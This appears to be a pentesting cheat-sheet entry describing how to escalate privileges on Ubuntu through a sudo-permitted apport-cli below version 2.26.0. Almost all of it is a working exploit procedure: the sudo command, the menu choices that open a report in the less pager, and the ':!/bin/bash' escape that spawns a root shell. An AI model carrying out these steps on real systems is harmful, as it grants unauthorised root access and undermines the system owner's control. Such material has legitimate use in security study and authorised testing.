```
apport-cli is a command-line tool for reporting and analysing application crashes and errors in Ubuntu and other Debian-based Linux distributions.

Vulnerable version are <2.26.0 
Check with : apport-cli -v

To privilege escalate we need the use the pager function provided by less

sudo /usr/bin/apport-cli -f
choose 1 > 1: Display (X.org)
choose 2 > 2: Freezes or hangs during boot or usage
choose V > V: View report
spawn shell > :!/bin/bash
```